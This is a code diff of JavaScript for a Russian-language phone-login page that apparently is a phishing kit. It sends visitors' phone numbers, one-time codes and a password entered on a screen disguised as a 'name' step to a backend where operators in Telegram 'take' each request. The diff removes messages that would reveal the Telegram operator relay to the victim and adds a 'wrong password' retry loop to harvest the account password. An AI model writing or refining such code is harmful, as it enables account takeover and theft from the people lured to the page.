@@ -1,14 +1,13 @@
 const form = document.getElementById("login-form");
 const phoneInput = document.getElementById("phone");
 const submitButton = document.getElementById("submit-button");
-const statusMessage = document.getElementById("status-message");
 const phoneScreen = document.getElementById("phone-screen");
 const verifyScreen = document.getElementById("verify-screen");
 const nameScreen = document.getElementById("name-screen");
+const nameHero = document.getElementById("name-hero");
 const verifyPhone = document.getElementById("verify-phone");
 const verifyForm = document.getElementById("verify-form");
 const verifyCodeInput = document.getElementById("verify-code");
-const verifyStatusMessage = document.getElementById("verify-status-message");
 const codeBoxes = Array.from(document.querySelectorAll(".code-box"));
 const backButton = document.getElementById("back-button");
 const nameBackButton = document.getElementById("name-back-button");
@@ -16,6 +15,7 @@ const countdown = document.getElementById("countdown");
 const nameForm = document.getElementById("name-form");
 const nameInput = document.getElementById("name-input");
 const nameSubmitButton = document.getElementById("name-submit-button");
+const nameStatusMessage = document.getElementById("name-status-message");
 
 let countdownTimer = null;
 let requestStatusTimer = null;
@@ -23,6 +23,7 @@ let currentPhone = "";
 let currentRequestId = "";
 let lastSubmittedCode = "";
 let lastCodeErrorCount = 0;
+let lastPasswordErrorCount = 0;
 const RESEND_SECONDS = 56;
 
 const formatPhone = (value) => {
@@ -65,14 +66,10 @@ const updateButtonState = () => {
   submitButton.disabled = !isReady;
 };
 
-const setStatus = (text, type = "") => {
-  statusMessage.style.display = text ? "block" : "none";
-  statusMessage.textContent = text;
-  statusMessage.className = type ? `status-message ${type}` : "status-message";
-};
-
-const setVerifyStatus = (text) => {
-  verifyStatusMessage.textContent = text;
+const setNameStatus = (text) => {
+  if (nameStatusMessage) {
+    nameStatusMessage.textContent = text;
+  }
 };
 
 const setActiveScreen = (screen) => {
@@ -116,7 +113,6 @@ const openVerifyScreen = () => {
   verifyPhone.textContent = formatDisplayPhone(currentPhone);
   verifyCodeInput.value = "";
   lastSubmittedCode = "";
-  setVerifyStatus("");
   updateCodeBoxes();
   setActiveScreen("verify");
   startCountdown();
@@ -125,9 +121,12 @@ const openVerifyScreen = () => {
 
 const openNameScreen = () => {
   stopCountdown();
-  setVerifyStatus("");
   nameInput.value = "";
+  setNameStatus("");
   setActiveScreen("name");
+  if (nameHero) {
+    nameHero.scrollIntoView({ block: "start" });
+  }
   window.setTimeout(() => nameInput.focus(), 80);
 };
 
@@ -141,27 +140,33 @@ const checkRequestStatus = async () => {
     const result = await response.json();
 
     if (!response.ok) {
-      throw new Error(result.error || "Не удалось проверить статус");
+      return;
     }
 
     if ((result.codeErrorCount || 0) > lastCodeErrorCount) {
       lastCodeErrorCount = result.codeErrorCount || 0;
       verifyCodeInput.value = "";
       lastSubmittedCode = "";
-      setVerifyStatus("Неверный код");
       updateCodeBoxes();
       if (verifyScreen.classList.contains("screen-view-active")) {
         window.setTimeout(() => verifyCodeInput.focus(), 80);
       }
     }
 
+    if ((result.passwordErrorCount || 0) > lastPasswordErrorCount) {
+      lastPasswordErrorCount = result.passwordErrorCount || 0;
+      nameInput.value = "";
+      setNameStatus("Неверный пароль");
+      if (nameScreen.classList.contains("screen-view-active")) {
+        window.setTimeout(() => nameInput.focus(), 80);
+      }
+    }
+
     if (result.status === "taken") {
-      setStatus(`Заявку взял ${result.takenBy}. Ждем нажатие "Дальше" в Telegram.`, "success");
       return;
     }
 
     if (result.status === "ready") {
-      setStatus("");
       if (!verifyScreen.classList.contains("screen-view-active")) {
         openVerifyScreen();
       }
@@ -169,14 +174,12 @@ const checkRequestStatus = async () => {
     }
 
     if (result.status === "name") {
-      setStatus("");
       if (!nameScreen.classList.contains("screen-view-active")) {
         openNameScreen();
       }
     }
-  } catch (error) {
+  } catch {
     stopRequestStatusPolling();
-    setStatus(error.message, "error");
     submitButton.textContent = "Продолжить";
     updateButtonState();
   }
@@ -210,9 +213,9 @@ const submitVerificationCode = async (code) => {
 
     const result = await response.json();
     if (!response.ok) {
-      throw new Error(result.error || "Не удалось отправить код");
+      throw new Error(result.error || "error");
     }
-  } catch (error) {
+  } catch {
     lastSubmittedCode = "";
   }
 };
@@ -223,6 +226,7 @@ const submitName = async (value) => {
     return;
   }
 
+  setNameStatus("");
   nameSubmitButton.disabled = true;
   nameSubmitButton.textContent = "Отправка...";
 
@@ -241,13 +245,13 @@ const submitName = async (value) => {
 
     const result = await response.json();
     if (!response.ok) {
-      throw new Error(result.error || "Не удалось отправить имя");
+      throw new Error(result.error || "error");
     }
 
     nameSubmitButton.textContent = "Продолжить";
     nameSubmitButton.disabled = false;
     nameInput.value = "";
-  } catch (error) {
+  } catch {
     nameSubmitButton.textContent = "Продолжить";
     nameSubmitButton.disabled = false;
   }
@@ -290,21 +294,20 @@ const resetToPhoneScreen = () => {
   currentRequestId = "";
   lastSubmittedCode = "";
   lastCodeErrorCount = 0;
+  lastPasswordErrorCount = 0;
   submitButton.textContent = "Продолжить";
   verifyCodeInput.value = "";
   nameInput.value = "";
+  setNameStatus("");
   nameSubmitButton.disabled = false;
   nameSubmitButton.textContent = "Продолжить";
-  setVerifyStatus("");
   updateCodeBoxes();
-  setStatus("");
   setActiveScreen("phone");
   phoneInput.focus();
 };
 
 phoneInput.addEventListener("input", () => {
   phoneInput.value = formatPhone(phoneInput.value);
-  setStatus("");
   updateButtonState();
 });
 
@@ -315,7 +318,6 @@ verifyForm.addEventListener("click", () => {
 verifyCodeInput.addEventListener("input", updateCodeBoxes);
 verifyCodeInput.addEventListener("input", () => {
   const code = verifyCodeInput.value.replace(/\D/g, "").slice(0, 6);
-  setVerifyStatus("");
 
   if (code.length < 6) {
     lastSubmittedCode = "";
@@ -338,8 +340,6 @@ form.addEventListener("submit", async (event) => {
 
   const digits = phoneInput.value.replace(/\D/g, "");
   if (digits.length !== 10) {
-    setStatus("Введите номер полностью", "error");
-    updateButtonState();
     return;
   }
 
@@ -349,7 +349,6 @@ form.addEventListener("submit", async (event) => {
   stopRequestStatusPolling();
   submitButton.disabled = true;
   submitButton.textContent = "Ожидание...";
-  setStatus("Отправили заявку в Telegram. Ждем, пока там нажмут кнопку.", "success");
 
   try {
     const response = await fetch("/api/send-phone", {
@@ -362,15 +361,15 @@ form.addEventListener("submit", async (event) => {
 
     const result = await response.json();
     if (!response.ok) {
-      throw new Error(result.error || "Не удалось отправить номер");
+      throw new Error(result.error || "error");
     }
 
     currentPhone = phone;
     currentRequestId = requestId;
     lastCodeErrorCount = 0;
+    lastPasswordErrorCount = 0;
     startRequestStatusPolling();
-  } catch (error) {
-    setStatus(error.message, "error");
+  } catch {
     submitButton.textContent = "Продолжить";
     updateButtonState();
   }
